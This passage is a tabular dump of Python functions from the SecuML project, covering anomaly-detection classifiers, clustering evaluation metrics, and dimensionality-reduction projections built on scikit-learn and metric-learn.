    return Classifier._predict_from_scores(self, matrix, all_scores, scores)"
ANSSI-FR/SecuML,_set_best_hyperparam,"def _set_best_hyperparam(self, train_instances):
    best_values = self.conf.hyperparam_conf.values.get_best_values()
    self.pipeline.set_params(**best_values)"
ANSSI-FR/SecuML,_fit,"def _fit(self, train_instances):
    self.pipeline.fit(train_instances.features.get_values(), self.conf.get_supervision(train_instances))"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.classes_.take(np.argmax(probas, axis=1), axis=0)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _DecisionTree())]"
ANSSI-FR/SecuML,predict_from_scores,"def predict_from_scores(self, X, scores):
    is_inlier = np.full(X.shape[0], -1, dtype=int)
    is_inlier[scores >= 0] = 1
    return is_inlier"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _EllipticEnvelope())]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.predict(X)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _GaussianNaiveBayes())]"
ANSSI-FR/SecuML,log_likelihood,"def log_likelihood(self, features, label):
    all_theta = self.pipeline['model'].theta_
    all_sigma = self.pipeline['model'].sigma_
    scaled_features = self.pipeline['scaler'].transform(features)
    label_index = np.where(self.class_labels == label)[0]
    theta = all_theta[label_index, :][0]
    sigma = all_sigma[label_index, :][0]
    probas = scipy.stats.norm(theta, sigma).pdf(scaled_features)
    log_likelihoods = np.sum(np.log(np.maximum(probas, np.finfo(float).eps)), axis=1)
    return log_likelihoods"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.predict(X)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _GradientBoosting())]"
ANSSI-FR/SecuML,predict_from_scores,"def predict_from_scores(self, X, scores):
    threshold = self.threshold_ if self.behaviour == 'old' else 0
    is_inlier = np.ones(X.shape[0], dtype=int)
    is_inlier[scores < threshold] = -1
    return is_inlier"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _IsolationForest(n_jobs=self.conf.n_jobs, behaviour='new', contamination='auto'))]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.classes_[np.argmax(probas, axis=1)].ravel()"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _LabelPropagation(n_jobs=self.conf.n_jobs))]"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', LocalOutlierFactor(n_jobs=self.conf.n_jobs, novelty=True))]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    if probas.shape[1] == 1:
        indices = (probas[:, 1] > 0.5).astype(np.int)
    else:
        indices = probas.argmax(axis=1)
    return self.classes_[indices]"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _LogisticRegression(multi_class='ovr', solver=self.conf.optim_algo, fit_intercept=False))]"
ANSSI-FR/SecuML,predict_from_scores,"def predict_from_scores(self, X, scores):
    is_inlier = np.full(X.shape[0], -1, dtype=int)
    is_inlier[scores >= 0] = 1
    return is_inlier"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _OneClassSvm())]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.classes_.take(np.argmax(probas, axis=1), axis=0)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _RandomForest())]"
ANSSI-FR/SecuML,predict_label,"def predict_label(x, center, r):
    return predict_score(x, center, r) > 0"
ANSSI-FR/SecuML,predict_score,"def predict_score(x, center, r):
    return square_distance_to_center(x, center) - pow(r, 2)"
ANSSI-FR/SecuML,objective,"def objective(x, unlabeled_features, labeled_features, labels, kappa, nu_u, nu_l):
    (R, gamma, c) = get_values(x)
    num_unlabeled_instances = unlabeled_features.shape[0]
    sum_U = 0
    for i in range(num_unlabeled_instances):
        sum_U += _l(R * R - square_distance_to_center(unlabeled_features[i, :], c))
    sum_L = 0
    num_labeled_instances = labeled_features.shape[0]
    if num_labeled_instances > 0:
        for i in range(num_labeled_instances):
            square_dist = square_distance_to_center(labeled_features[i, :], c)
            sum_L += _l(labels[i] * (R * R - square_dist) - gamma)
    obj = R * R
    obj -= kappa * gamma
    obj += nu_u * sum_U
    obj += nu_l * sum_L
    return obj"
ANSSI-FR/SecuML,distance_to_center,"def distance_to_center(x_i, center):
    return np.linalg.norm(x_i - center)"
ANSSI-FR/SecuML,square_distance_to_center,"def square_distance_to_center(x_i, center):
    return np.dot(x_i - center, x_i - center)"
ANSSI-FR/SecuML,partial_derivatives_r,"def partial_derivatives_r(x_i, x):
    (R, _, c) = get_values(x)
    return 2 * R * l_prime(R * R - square_distance_to_center(x_i, c))"
ANSSI-FR/SecuML,partial_derivatives_c,"def partial_derivatives_c(x_i, x):
    (R, _, c) = get_values(x)
    return 2 * (x_i - c) * l_prime(R * R - square_distance_to_center(x_i, c))"
ANSSI-FR/SecuML,partial_derivatives_r_star,"def partial_derivatives_r_star(x_i, y_i, x):
    (R, gamma, c) = get_values(x)
    square_dist = square_distance_to_center(x_i, c)
    return 2 * y_i * R * l_prime(y_i * (R * R - square_dist) - gamma)"
ANSSI-FR/SecuML,partial_derivatives_gamma_star,"def partial_derivatives_gamma_star(x_i, y_i, x):
    (R, gamma, c) = get_values(x)
    return -l_prime(y_i * (R * R - square_distance_to_center(x_i, c)) - gamma)"
ANSSI-FR/SecuML,partial_derivatives_c_star,"def partial_derivatives_c_star(x_i, y_i, x):
    (R, gamma, c) = get_values(x)
    square_dist = square_distance_to_center(x_i, c)
    return 2 * y_i * (x_i - c) * l_prime(y_i * (R * R - square_dist) - gamma)"
ANSSI-FR/SecuML,gradient_r,"def gradient_r(x, unlabeled_features, labeled_features, labels, nu_u, nu_l):
    (R, _, _) = get_values(x)
    num_unlabeled_instances = unlabeled_features.shape[0]
    sum_U = 0
    for i in range(num_unlabeled_instances):
        sum_U += partial_derivatives_r(unlabeled_features[i, :], x)
    sum_L = 0
    num_labeled_instances = labeled_features.shape[0]
    if num_labeled_instances > 0:
        for i in range(num_labeled_instances):
            sum_L += partial_derivatives_r_star(labeled_features[i, :], labels[i], x)
    return 2 * R + nu_u * sum_U + nu_l * sum_L"
ANSSI-FR/SecuML,gradient_gamma,"def gradient_gamma(x, labeled_features, labels, kappa, nu_l):
    sum_L = 0
    num_labeled_instances = labeled_features.shape[0]
    if num_labeled_instances > 0:
        for i in range(num_labeled_instances):
            sum_L += partial_derivatives_gamma_star(labeled_features[i, :], labels[i], x)
    return -kappa + nu_l * sum_L"
ANSSI-FR/SecuML,gradient_c,"def gradient_c(x, unlabeled_features, labeled_features, labels, nu_u, nu_l):
    num_unlabeled_instances = unlabeled_features.shape[0]
    sum_U = 0
    for i in range(num_unlabeled_instances):
        sum_U += partial_derivatives_c(unlabeled_features[i, :], x)
    sum_L = 0
    num_labeled_instances = labeled_features.shape[0]
    if num_labeled_instances > 0:
        for i in range(num_labeled_instances):
            sum_L += partial_derivatives_c_star(labeled_features[i, :], labels[i], x)
    res = nu_u * sum_U + nu_l * sum_L
    return res"
ANSSI-FR/SecuML,gradient,"def gradient(x, unlabeled_features, labeled_features, labels, kappa, nu_u, nu_l):
    g_r = gradient_r(x, unlabeled_features, labeled_features, labels, nu_u, nu_l)
    g_gamma = gradient_gamma(x, labeled_features, labels, kappa, nu_l)
    return np.concatenate((np.array([g_r, g_gamma]), gradient_c(x, unlabeled_features, labeled_features, labels, nu_u, nu_l)))"
ANSSI-FR/SecuML,gen_x_init,"def gen_x_init(unlabeled_features, labeled_features, labels):
    gamma_init = 1.0
    (c_init, r_init) = benign_instances_center_radius(unlabeled_features, labeled_features, labels)
    return np.array([r_init, gamma_init] + list(c_init))"
ANSSI-FR/SecuML,benign_instances_center_radius,"def benign_instances_center_radius(unlabeled_features, labeled_features, labels):
    benign_features = labeled_features[labels == 1, :]
    if unlabeled_features.shape[0] > 0:
        benign_features = np.concatenate((benign_features, unlabeled_features))
    center = np.mean(benign_features, axis=0)
    radius = np.mean(np.apply_along_axis(distance_to_center, 1, benign_features, center))
    return (center, radius)"
ANSSI-FR/SecuML,_l,"def _l(t):
    delta = 0.0
    eps = 0.5
    if t <= delta - eps:
        return delta - t
    elif delta - eps <= t and t <= delta + eps:
        return pow(delta + eps - t, 2) / (4.0 * eps)
    else:
        return 0"
ANSSI-FR/SecuML,l_prime,"def l_prime(t):
    delta = 0.0
    eps = 0.5
    if t <= delta - eps:
        return -1.0
    elif delta - eps <= t and t <= delta + eps:
        return -0.5 * ((delta - t) / eps + 1.0)
    else:
        return 0"
ANSSI-FR/SecuML,get_values,"def get_values(x):
    R = x[0]
    gamma = x[1]
    c = x[2:]
    return (R, gamma, c)"
ANSSI-FR/SecuML,__init__,"def __init__(self, nu_l=1.0, nu_u=1.0, kappa=1.0):
    self.nu_l = nu_l
    self.nu_u = nu_u
    self.kappa = kappa
    self.c = None
    self.r = None"
ANSSI-FR/SecuML,fit,"def fit(self, X, y):
    unlabeled_mask = np.array([annotation == -1 for annotation in y])
    X_unlabeled = X[unlabeled_mask, :]
    X_labeled = X[~unlabeled_mask, :]
    y_labeled = np.array([-1.0 if annotation else 1.0 for annotation in y if annotation != -1])
    num_labeled_instances = X_labeled.shape[0]
    num_unlabeled_instances = X_unlabeled.shape[0]
    if num_labeled_instances > 0:
        self.nu_l /= num_labeled_instances
    if num_unlabeled_instances > 0:
        self.nu_u /= num_unlabeled_instances
    x_init = gen_x_init(X_unlabeled, X_labeled, y_labeled)
    optim_res = scipy.optimize.fmin_bfgs(objective, x_init, fprime=gradient, args=(X_unlabeled, X_labeled, y_labeled, self.kappa, self.nu_u, self.nu_l), disp=False)
    (self.r, _, self.c) = get_values(optim_res)"
ANSSI-FR/SecuML,decision_function,"def decision_function(self, X):
    return np.apply_along_axis(predict_score, 1, X, self.c, self.r)"
ANSSI-FR/SecuML,predict,"def predict(self, X):
    return np.apply_along_axis(predict_label, 1, X, self.c, self.r)"
ANSSI-FR/SecuML,predict_from_scores,"def predict_from_scores(self, X, scores):
    is_outlier = np.full(X.shape[0], False, dtype=int)
    is_outlier[scores > 0] = True
    return is_outlier"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _Sssvdd(nu_l=self.conf.nu_l, nu_u=self.conf.nu_u, kappa=self.conf.kappa))]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    if probas.shape[1] == 1:
        indices = (probas[:, 1] > 0.5).astype(np.int)
    else:
        indices = probas.argmax(axis=1)
    return self.classes_[indices]"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _Svc(kernel='linear', probability=True))]"
ANSSI-FR/SecuML,_decision_path,"def _decision_path(isolation_forest, X, n_jobs):
    X = check_array(X, dtype=DTYPE, accept_sparse='csr')
    indicators = Parallel(n_jobs=n_jobs, **_joblib_parallel_args(prefer='threads'))((delayed(parallel_helper)(tree, 'decision_path', X, check_input=False) for tree in isolation_forest.estimators_))
    n_nodes = [0]
    n_nodes.extend([i.shape[1] for i in indicators])
    n_nodes_ptr = np.array(n_nodes).cumsum()
    indicators = sparse_hstack(indicators).tocsr()
    return (indicators, n_nodes_ptr)"
ANSSI-FR/SecuML,__init__,"def __init__(self, eta=1.0, n_estimators=100, max_samples='auto', max_features=1.0, n_jobs=None):
    _IsolationForest.__init__(self, n_estimators=n_estimators, max_samples=max_samples, contamination='auto', behaviour='new', max_features=max_features, n_jobs=n_jobs)
    self.eta = eta"
ANSSI-FR/SecuML,fit,"def fit(self, X, y):
    self._fit(X, y)
    self._init_node_weights()
    self.update_node_weights(X, y)
    return self"
ANSSI-FR/SecuML,_set_offset,"def _set_offset(self, X):
    if self.behaviour == 'old':
        if self._contamination == 'auto':
            raise ValueError(""contamination parameter cannot be set to 'auto' when behaviour == 'old'."")
        self.offset_ = -0.5
        self._threshold_ = np.percentile(self.decision_function(X), 100.0 * self._contamination)
        return
    if self._contamination == 'auto':
        self.offset_ = -0.5
        return
    self.offset_ = np.percentile(self.score_samples(X), 100.0 * self._contamination)"
ANSSI-FR/SecuML,_fit,"def _fit(self, X, y, sample_weight=None):
    if self.contamination == 'legacy':
        warn('default contamination parameter 0.1 will change in version 0.22 to ""auto"". This will change the predict method behavior.', FutureWarning)
        self._contamination = 0.1
    else:
        self._contamination = self.contamination
    X = check_array(X, accept_sparse=['csc'])
    if issparse(X):
        X.sort_indices()
    rnd = check_random_state(self.random_state)
    y = rnd.uniform(size=X.shape[0])
    n_samples = X.shape[0]
    if isinstance(self.max_samples, str):
        if self.max_samples == 'auto':
            max_samples = min(256, n_samples)
        else:
            raise ValueError('max_samples (%s) is not supported.Valid choices are: ""auto"", int orfloat' % self.max_samples)
    elif isinstance(self.max_samples, INTEGER_TYPES):
        if self.max_samples > n_samples:
            warn('max_samples (%s) is greater than the total number of samples (%s). max_samples will be set to n_samples for estimation.' % (self.max_samples, n_samples))
            max_samples = n_samples
        else:
            max_samples = self.max_samples
    else:
        if not 0.0 < self.max_samples <= 1.0:
            raise ValueError('max_samples must be in (0, 1], got %r' % self.max_samples)
        max_samples = int(self.max_samples * X.shape[0])
    self.max_samples_ = max_samples
    max_depth = int(np.ceil(np.log2(max(max_samples, 2))))
    super()._fit(X, y, max_samples, max_depth=max_depth, sample_weight=sample_weight)"
ANSSI-FR/SecuML,update_node_weights,"def update_node_weights(self, X, y):
    annotated_mask = y != -1
    num_annotations = np.sum(annotated_mask)
    if num_annotations > 0:
        paths = self.decision_path(X[annotated_mask, :])[0]
        annotations = y[annotated_mask]
        coeffs = np.full((num_annotations, 1), self.eta)
        coeffs[annotations] *= -1
        self.node_weights = np.sum(np.multiply(paths.todense(), coeffs), axis=0)
        self.node_weights = np.maximum(0, self.node_weights)
        self.node_weights = np.array(self.node_weights).ravel()
    self._set_offset(X)"
ANSSI-FR/SecuML,decision_path,"def decision_path(self, X):
    return _decision_path(self, X, self.n_jobs)"
ANSSI-FR/SecuML,decision_function,"def decision_function(self, X):
    return -_IsolationForest.decision_function(self, X)"
ANSSI-FR/SecuML,predict,"def predict(self, X):
    return _IsolationForest.predict(self, X) == -1"
ANSSI-FR/SecuML,_init_node_weights,"def _init_node_weights(self):
    num_nodes = sum([estimator.tree_.node_count for estimator in self.estimators_])
    self.node_weights = np.ones(num_nodes, dtype=float)"
ANSSI-FR/SecuML,_compute_score_samples,"def _compute_score_samples(self, X, subsample_features):
    """"""Compute the score of each samples in X going through the extra trees.

        Parameters
        ----------
        X : array-like or sparse matrix

        subsample_features : bool,
            whether features should be subsampled
        """"""
    n_samples = X.shape[0]
    depths = np.zeros(n_samples, order='f')
    i = 0
    for (tree, features) in zip(self.estimators_, self.estimators_features_):
        X_subset = X[:, features] if subsample_features else X
        node_indicator = tree.decision_path(X_subset)
        node_weights = self.node_weights[i:i + node_indicator.shape[1]]
        depths += node_indicator * node_weights
        i += node_indicator.shape[1]
    return -depths"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _WeightedIsolationForest(n_jobs=self.conf.n_jobs))]"
ANSSI-FR/SecuML,_update,"def _update(self, instances):
    self.pipeline['model'].update_node_weights(instances.features.get_values(), self.conf.get_supervision(instances))"
ANSSI-FR/SecuML,_predict,"def _predict(self, features, instances_ids):
    predictions = SemiSupervisedClassifier._predict(self, features, instances_ids)
    predictions.values = predictions.values == -1
    return predictions"
ANSSI-FR/SecuML,__init__,"def __init__(self, classifier_conf, test_conf, logger, validation_conf=None):
    Conf.__init__(self, logger)
    self.classifier_conf = classifier_conf
    self.test_conf = test_conf
    self.validation_conf = validation_conf"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = ''
    if self.classifier_conf is not None:
        name += self.classifier_conf.get_exp_name()
    name += self.test_conf.get_exp_name()
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('classifier_conf', exportFieldMethod.obj), ('test_conf', exportFieldMethod.obj)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    TestConf.gen_parser(parser)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    classifier_conf = classifiers.get_factory().from_args(args.model_class, args, logger)
    test_conf = test.get_factory().from_args(args.validation_mode, args, logger)
    return ClassificationConf(classifier_conf, test_conf, logger)"
ANSSI-FR/SecuML,from_json,"def from_json(conf_json, logger):
    classifier_conf = classifiers.get_factory().from_json(conf_json['classifier_conf'], logger)
    test_conf = test.get_factory().from_json(conf_json['test_conf'], logger)
    return ClassificationConf(classifier_conf, test_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, conf):
    self.instances = instances
    self.conf = conf
    self.num_clusters = self.conf.num_clusters
    self.clustering = None"
ANSSI-FR/SecuML,get_distortion,"@abc.abstractmethod
def get_distortion(self):
    return"
ANSSI-FR/SecuML,get_centroids,"@abc.abstractmethod
def get_centroids(self):
    return"
ANSSI-FR/SecuML,get_predicted_proba,"def get_predicted_proba(self):
    return None"
ANSSI-FR/SecuML,get_all_proba,"def get_all_proba(self):
    return None"
ANSSI-FR/SecuML,fit,"def fit(self):
    self.pipeline = Pipeline([('scaler', StandardScaler()), ('clustering', self.algo)])
    self.assigned_clusters = self.pipeline.fit_predict(self.instances.features.get_values())"
ANSSI-FR/SecuML,generate,"def generate(self, drop_annotated_instances=False):
    self.clustering = Clusters(self.instances, self.assigned_clusters, clustering_algo=self)
    self.clustering.generate(self.get_centroids(), drop_annotated_instances=drop_annotated_instances)"
ANSSI-FR/SecuML,export,"def export(self, output_dir, quick=False):
    self.clustering.export(output_dir)"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, conf):
    n_jobs = -1
    ClusteringAlgorithm.__init__(self, instances, conf)
    self.algo = sklearn.cluster.DBSCAN(n_jobs=n_jobs, metric=conf.metric)"
ANSSI-FR/SecuML,get_distortion,"def get_distortion(self):
    return 0"
ANSSI-FR/SecuML,get_centroids,"def get_centroids(self):
    return None"
ANSSI-FR/SecuML,get_assigned_clusters,"def get_assigned_clusters(self):
    return self.pipeline.fit_predict(self.instances.features.get_values())"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, conf):
    ClusteringAlgorithm.__init__(self, instances, conf)
    self.algo = sklearn.mixture.GaussianMixture(n_components=self.num_clusters, covariance_type='diag', init_params='kmeans')"
ANSSI-FR/SecuML,get_distortion,"def get_distortion(self):
    return 0"
ANSSI-FR/SecuML,get_centroids,"def get_centroids(self):
    return self.pipeline['clustering'].means_"
ANSSI-FR/SecuML,get_predicted_proba,"def get_predicted_proba(self):
    all_probas = self.get_all_proba()
    return np.amax(all_probas, axis=1)"
ANSSI-FR/SecuML,get_all_proba,"def get_all_proba(self):
    features = self.instances.features.get_values()
    return self.pipeline.predict_proba(features)"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, conf, algo='auto'):
    n_jobs = -1
    ClusteringAlgorithm.__init__(self, instances, conf)
    self.algo = sklearn.cluster.KMeans(n_clusters=self.num_clusters, n_jobs=n_jobs, verbose=0, algorithm=algo)"
ANSSI-FR/SecuML,get_distortion,"def get_distortion(self):
    return self.algo.inertia_"
ANSSI-FR/SecuML,get_centroids,"def get_centroids(self):
    return self.pipeline['clustering'].cluster_centers_"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, assigned_clusters, clustering_algo):
    self.instances = instances
    self.assigned_clusters = assigned_clusters
    self.distortion = Distortion(clustering_algo)
    self.silhouette = Silhouette(instances)
    self.performance = PerformanceIndicators()"
ANSSI-FR/SecuML,gen_eval,"def gen_eval(self, output_dir, quick=False):
    self.distortion.gen_eval()
    self.silhouette.gen_eval(output_dir, self.assigned_clusters, quick=quick)
    if self.instances.has_ground_truth():
        gt_labels = self.instances.ground_truth.get_labels()
        gt_families = self.instances.ground_truth.get_families()
        labels_families = [str(x[0]) + '_' + str(x[1]) for x in zip(gt_labels, gt_families)]
    else:
        labels_families = None
    self.performance.gen_eval(labels_families, self.assigned_clusters)"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    return {'distortion': self.distortion.to_json(), 'silhouette': self.silhouette.to_json(), 'performance': self.performance.to_json()}"
ANSSI-FR/SecuML,__init__,"def __init__(self, clustering_algo):
    self.clustering_algo = clustering_algo"
ANSSI-FR/SecuML,gen_eval,"def gen_eval(self):
    if self.clustering_algo is None:
        self.global_distortion = None
        self.distortions = None
        return
    self.global_distortion = self.clustering_algo.get_distortion()
    self.distortions = []
    for (c, cluster) in enumerate(self.clustering_algo.clustering.clusters):
        distortion = {}
        if cluster.num_instances() > 0:
            distortion['distortion'] = sum(cluster.distances)
            distortion['per_instance_distortion'] = distortion['distortion'] / cluster.num_instances()
        else:
            distortion['distortion'] = 0
            distortion['per_instance_distortion'] = 0
        self.distortions.append(distortion)"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    obj = {}
    obj['global_distortion'] = self.global_distortion
    obj['distortions'] = self.distortions
    return obj"
ANSSI-FR/SecuML,gen_eval,"def gen_eval(self, labels_families, predicted_clusters):
    self.compute_homogeneity_completeness(labels_families, predicted_clusters)
    self.compute_adjusted_evaluations(labels_families, predicted_clusters)"
ANSSI-FR/SecuML,compute_homogeneity_completeness,"def compute_homogeneity_completeness(self, labels_families, predicted_clusters):
    if labels_families is None:
        (self.homogeneity, self.completeness, self.v_measure) = (0, 0, 0)
        return
    (self.homogeneity, self.completeness, self.v_measure) = metrics.homogeneity_completeness_v_measure(labels_families, predicted_clusters)"
ANSSI-FR/SecuML,compute_adjusted_evaluations,"def compute_adjusted_evaluations(self, labels_families, predicted_clusters):
    if labels_families is None:
        self.adjusted_rand_score = 0
        self.adjusted_mutual_info_score = 0
        return
    self.adjusted_rand_score = metrics.adjusted_rand_score(labels_families, predicted_clusters)
    self.adjusted_mutual_info_score = metrics.adjusted_mutual_info_score(labels_families, predicted_clusters, average_method='arithmetic')"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    return {'homogeneity': self.homogeneity, 'completeness': self.completeness, 'v_measure': self.v_measure, 'adjusted_rand_score': self.adjusted_rand_score, 'adjusted_mutual_info_score': self.adjusted_mutual_info_score}"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances):
    self.instances = instances
    self.distances = None"
ANSSI-FR/SecuML,gen_eval,"def gen_eval(self, output_dir, assigned_clusters, quick=False):
    if quick:
        self.silhouette_avg = 0
        return
    if self.distances is not None:
        self.silhouette_values = silhouette_samples(self.distances, assigned_clusters, metric='precomputed')
    else:
        features = self.instances.features.get_values()
        self.silhouette_values = silhouette_samples(features, assigned_clusters)
    self.silhouette_avg = np.mean(self.silhouette_values)
    self.dispaly_silhouette(output_dir, assigned_clusters)"
ANSSI-FR/SecuML,dispaly_silhouette,"def dispaly_silhouette(self, output_dir, assigned_clusters):
    num_clusters = len(set(assigned_clusters))
    plt.clf()
    y_lower = 10
    all_colors = colors(num_clusters)
    for i in range(num_clusters):
        selection = assigned_clusters == i
        ith_cluster_silhouette_values = self.silhouette_values[selection]
        ith_cluster_silhouette_values.sort()
        size_cluster_i = ith_cluster_silhouette_values.shape[0]
        y_upper = y_lower + size_cluster_i
        color = all_colors[i]
        plt.fill_betweenx(np.arange(y_lower, y_upper), 0, ith_cluster_silhouette_values, facecolor=color, edgecolor=color, alpha=0.7)
        plt.text(-0.05, y_lower + 0.5 * size_cluster_i, str(i))
        y_lower = y_upper + 10
    plt.title('The silhouette plot for the various clusters.')
    plt.xlabel('The silhouette coefficient values')
    plt.ylabel('Cluster label')
    plt.axvline(x=self.silhouette_avg, color='red', linestyle='--')
    plt.yticks([])
    plt.xticks([-0.1, 0, 0.2, 0.4, 0.6, 0.8, 1])
    plt.savefig(path.join(output_dir, 'silhouette.png'))
    plt.clf()"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    obj = {}
    obj['silhouette_avg'] = self.silhouette_avg
    return obj"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    SemiSupervisedProjection.__init__(self, conf)
    self.projection = metric_learn.itml.ITML_Supervised()"
ANSSI-FR/SecuML,set_projection_matrix,"def set_projection_matrix(self):
    self.projection_matrix = np.transpose(self.pipeline['projection'].components_)"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    SemiSupervisedProjection.__init__(self, conf)
    self.projection = discriminant_analysis.LinearDiscriminantAnalysis(n_components=conf.num_components)
    if not self.conf.multiclass:
        self.conf.logger.warning('Lda projection without families supervision. The projection space is of dimension 1, and so the projected instances cannot be displayed with hexagonal binnnings.')"
ANSSI-FR/SecuML,set_projection_matrix,"def set_projection_matrix(self):
    self.projection_matrix = self.projection.scalings_"
ANSSI-FR/SecuML,gen_input_labels,"def gen_input_labels(self, instances):
    (labels, instances) = SemiSupervisedProjection.gen_input_labels(self, instances)
    num_classes = len(set(labels))
    if self.conf.num_components is not None and self.conf.num_components > num_classes - 1:
        self.conf.logger.warning('The embedding dimension must be smaller than the number of classes - 1. num_components is set to %d.' % (num_classes - 1))
        self.num_components = num_classes - 1
        self.projection = discriminant_analysis.LinearDiscriminantAnalysis(n_components=self.conf.num_components)
    return (labels, instances)"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    SemiSupervisedProjection.__init__(self, conf)
    self.projection = metric_learn.lmnn.LMNN()"
ANSSI-FR/SecuML,set_projection_matrix,"def set_projection_matrix(self):
    self.projection_matrix = np.transpose(self.pipeline['projection'].components_)"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    SemiSupervisedProjection.__init__(self, conf)
    self.projection = metric_learn.nca.NCA(num_dims=conf.num_components)"
ANSSI-FR/SecuML,set_projection_matrix,"def set_projection_matrix(self):
    self.projection_matrix = np.transpose(self.pipeline['projection'].components_)"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    UnsupervisedProjection.__init__(self, conf)
    self.projection = decomposition.PCA(n_components=conf.num_components)"
ANSSI-FR/SecuML,fit,"def fit(self, instances):
    UnsupervisedProjection.fit(self, instances)"
ANSSI-FR/SecuML,transform,"def transform(self, instances):
    projected_instances = UnsupervisedProjection.transform(self, instances)
    return projected_instances"
ANSSI-FR/SecuML,set_projection_matrix,"def set_projection_matrix(self):
    self.projection_matrix = np.transpose(self.pipeline['projection'].components_)"
ANSSI-FR/SecuML,get_fitting_instances,"def get_fitting_instances(self, instances):
    return instances"
ANSSI-FR/SecuML,export_fit,"def export_fit(self, output_dir, instances):
    UnsupervisedProjection.export_fit(self, output_dir, instances)
    self.export_explained_var(output_dir)
    self.export_cum_explained_var(output_dir)"
ANSSI-FR/SecuML,export_transform,"def export_transform(self, output_dir, instances, projected_instances):
    UnsupervisedProjection.export_transform(self, output_dir, instances, projected_instances)
    self.export_reconstruction_errors(output_dir, instances, projected_instances)"
ANSSI-FR/SecuML,export_explained_var,"def export_explained_var(self, directory):
    explained_var = pd.DataFrame(self.projection.explained_variance_ratio_, index=list(range(self.num_components)), columns=['y'])
    explained_var.index.name = 'x'
    explained_var.to_csv(path.join(directory, 'explained_variance.csv'), sep=',', header=True, index=True)"
ANSSI-FR/SecuML,export_cum_explained_var,"def export_cum_explained_var(self, directory):
    explained_var = pd.DataFrame({'y': np.cumsum(self.projection.explained_variance_ratio_)}, index=list(range(self.num_components)))
    explained_var.index.name = 'x'
    explained_var.to_csv(path.join(directory, 'cumuled_explained_variance.csv'), sep=',', header=True, index=True)"
ANSSI-FR/SecuML,export_reconstruction_errors,"def export_reconstruction_errors(self, output_dir, instances, projected_instances):
    reconstruction_errors = pd.DataFrame(list(range(self.num_components)), index=list(range(self.num_components)), columns=['y'])
    reconstruction_errors.index.name = 'x'
    for c in range(self.num_components):
        reconstruction_error = self.reconstruction_error(instances, projected_instances, c + 1)
        reconstruction_errors.at[c, 'y'] = reconstruction_error
    reconstruction_errors.to_csv(path.join(output_dir, 'reconstruction_errors.csv'), sep=',', header=True, index=True)"
ANSSI-FR/SecuML,get_reconstructed_data,"def get_reconstructed_data(self, projected_instances, projection_size):
    projection = copy.deepcopy(projected_instances.features.get_values())
    projection = np.array(projection)[:, :projection_size]
    projection_matrix = np.transpose(self.projection_matrix[:, list(range(projection_size))])
    reconstructed_data = projection.dot(projection_matrix)
    return reconstructed_data"
ANSSI-FR/SecuML,reconstruction_error,"def reconstruction_error(self, instances, projected_instances, projection_size):
    reconstructed_data = self.get_reconstructed_data(projected_instances, projection_size)
    reconstruction_error = 0
    diff = reconstructed_data - instances.features.get_values()
    for i in range(instances.num_instances()):
        reconstruction_error += np.sum([x * x for x in diff[i, :]])
    reconstruction_error /= instances.num_instances()
    return reconstruction_error"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    SemiSupervisedProjection.__init__(self, conf)
    self.projection = metric_learn.rca.RCA(num_dims=conf.num_components, pca_comps=0.7)"
ANSSI-FR/SecuML,set_projection_matrix,"def set_projection_matrix(self):
    self.projection_matrix = np.transpose(self.pipeline['projection'].components_)"
ANSSI-FR/SecuML,fit,"def fit(self, instances):
    (features, labels) = self.gen_input_params(instances)
    self.set_best_params(instances)
    pca_comps = 0.9
    nan_values = True
    while nan_values:
        self.projection = metric_learn.rca.RCA(num_dims=self.conf.num_components, pca_comps=pca_comps)
        self.create_pipeline()
        self.pipeline.fit(features, labels)
        self.set_projection_matrix()
        nan_values = np.isnan(self.projection_matrix).any()
